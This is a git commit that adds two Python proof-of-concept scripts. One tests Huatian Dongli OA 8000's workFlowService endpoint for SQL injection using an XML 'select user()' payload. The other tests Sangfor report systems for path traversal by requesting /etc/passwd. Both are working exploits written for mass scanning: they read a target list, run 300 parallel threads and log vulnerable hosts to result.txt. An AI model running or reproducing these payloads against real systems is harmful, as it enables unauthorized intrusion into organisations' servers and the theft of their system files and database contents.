ef12e8781c21cafa623ab7ceb874cbc6caec3d9b
wyn-lk <cloundside@gmail.com>
2024-06-12 20:31:30 +0800

    Add files via upload

---
+++ POC/华天动力OA 8000版 workFlowService SQL注入漏洞/1.py
@@ -0,0 +1,79 @@
+# app="华天动力-OA8000"
+import requests,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+proxies = { 
+       "http": "http://127.0.0.1:8080", 
+       "https": "http://127.0.0.1:8080" 
+       }
+def banner():
+	banner = """
+
+	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
+██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
+██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
+██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
+╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
+ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
+                                     info:华天动力OA 8000版 workFlowService接口存在SQL注入漏洞
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/OAapp/bfapp/buffalo/workFlowService"
+	url = target + payload_url
+	headers={
+		"Accept-Encoding":"identity",
+		"Content-Length":"103",
+		"Accept-Language":"zh-CN,zh;q=0.8",
+		"Accept": "*/*",
+		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
+		"Accept-Charset":"GBK,utf-8;q=0.7,*;q=0.3",
+		"Connection":"keep-alive",
+		"Cache-Control":"max-age=0" 
+	}
+	data='''
+		<buffalo-call> <method>getDataListForTree</method> 
+		<string>select user()</string> 
+		</buffalo-call>
+'''
+	try:
+		res = requests.get(url=target,verify=False)
+		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
+		if res.status_code == 200:
+			if res1.status_code == 200 and "root" in res1.text:
+				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
+				with open("result.txt","a",encoding="utf-8") as f:
+					f.write(target+"\n")
+			else:
+				print(f"[-]该url不存在SQL注入漏洞：{target}")
+		else:
+			print(f"该url连接失败：{target}")
+	except:
+		print(f"[*]该url出现错误：{target}")
+
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
---
+++ POC/深信服报表 任意读取/1.py
@@ -0,0 +1,68 @@
+# app="SANGFOR-应用交付报表系统"
+import requests,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+proxies = { 
+       "http": "http://127.0.0.1:8080", 
+       "https": "http://127.0.0.1:8080" 
+       }
+def banner():
+	banner = """
+
+	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
+██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
+██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
+██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
+╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
+ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
+                                     info:深信服报表 任意读取
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/report/download.php?pdf=../../../../../etc/passwd"
+	url = target + payload_url
+	headers={
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
+        	'Connection': 'close'
+	}
+	try:
+		res = requests.get(url=target,verify=False)
+		res1 = requests.get(url=url,headers=headers,verify=False)
+		if res.status_code == 200:
+			if res1.status_code == 200 and "root" in res1.text:
+				print(f"{GREEN}[+]该url存在任意文件读取漏洞：{target}{RESET}")
+				with open("result.txt","a",encoding="utf-8") as f:
+					f.write(target+"\n")
+			else:
+				print(f"[-]该url不存在任意文件读取漏洞：{target}")
+		else:
+			print(f"该url连接失败：{target}")
+	except:
+		print(f"[*]该url出现错误：{target}")
+
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
